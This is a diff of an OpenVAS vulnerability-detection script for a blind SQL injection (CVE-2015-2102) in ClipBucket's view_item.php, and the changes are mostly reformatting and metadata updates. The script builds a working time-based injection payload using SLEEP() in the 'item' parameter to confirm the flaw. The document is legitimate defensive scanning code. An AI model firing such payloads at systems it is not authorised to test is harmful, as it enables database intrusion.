@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_clipbucket_sql_inj_vuln.nasl 6214 2017-05-26 09:04:01Z teissa $
+# $Id: gb_clipbucket_sql_inj_vuln.nasl 11423 2018-09-17 07:35:16Z cfischer $
 #
 # ClipBucket 'view_item.php' SQL Injection Vulnerability
 #
@@ -29,41 +29,39 @@ CPE = "cpe:/a:clipbucket_project:clipbucket";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805347");
-  script_version("$Revision: 6214 $");
+  script_version("$Revision: 11423 $");
   script_cve_id("CVE-2015-2102");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-26 11:04:01 +0200 (Fri, 26 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 09:35:16 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-05 15:20:26 +0530 (Thu, 05 Mar 2015)");
   script_name("ClipBucket 'view_item.php' SQL Injection Vulnerability");
 
-  script_tag(name: "summary" , value:"The host is installed with ClipBucket
+  script_tag(name:"summary", value:"The host is installed with ClipBucket
   and is prone to blind sql injection vulnerability.");
 
-  script_tag(name: "vuldetect" , value:"Send a crafted request via HTTP GET and
+  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
   check whether it is able to execute sql query or not.");
 
-  script_tag(name: "insight" , value:"Flaw is due to the view_item.php script
+  script_tag(name:"insight", value:"Flaw is due to the view_item.php script
   not properly sanitizing user-supplied input via the 'item' parameter.");
 
-  script_tag(name: "impact" , value:"Successful exploitation will allow remote
+  script_tag(name:"impact", value:"Successful exploitation will allow remote
   attackers to inject or manipulate SQL queries in the back-end database,
-  allowing for the manipulation or disclosure of arbitrary data.
+  allowing for the manipulation or disclosure of arbitrary data.");
 
-  Impact Level: Application");
-
-  script_tag(name: "affected" , value:"ClipBucket version 2.7.0.4.v2929, other
+  script_tag(name:"affected", value:"ClipBucket version 2.7.0.4.v2929, other
   versions may also be affected.");
 
-  script_tag(name: "solution" , value:"Upgrade to version 2.7.0.5 or later,
+  script_tag(name:"solution", value:"Upgrade to version 2.7.0.5 or later,
   For updates refer to http://clip-bucket.com");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
   script_tag(name:"qod_type", value:"remote_analysis");
 
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36156/");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/130485");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36156/");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130485");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -78,16 +76,6 @@ include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-dir = "";
-item = "";
-collection = "";
-http_port = "";
-sndReq = "";
-rcvRes = "";
-time_taken = 0;
-wait_extra_sec = 5;
-
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
@@ -98,10 +86,9 @@ if(!dir = get_app_location(cpe:CPE, port:http_port)){
 
 if( dir == "/" ) dir = "";
 
-##SEnd reuest and receive response
 sndReq = http_get(item:string(dir, "/index.php"),  port:http_port);
 rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
-      
+
 item = eregmatch(pattern:'item=([0-9a-zA-Z]+)', string:rcvRes);
 
 if(!item[1]){
@@ -115,11 +102,11 @@ if(!collection[1]){
 
 # Added three times, to make sure its working properly
 sleep = make_list(5, 7, 9);
+wait_extra_sec = 5;
 
 # Use sleep time to check we are able to execute command
 foreach sec (sleep)
 {
-  # Construct attack request
   url = dir + "/upload/view_item.php?item="+item[1]+"%27%20AND%20SLEEP("
             +sec+")%20AND%20%27Ypjn%27=%27Ypjn&type=photos&collection="+collection[1];
 
@@ -132,6 +119,6 @@ foreach sec (sleep)
   if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
 }
 
-report = report_vuln_url(port:http_port, url:url);  
+report = report_vuln_url(port:http_port, url:url);
 security_message(port:http_port, data:report);
 exit(0);
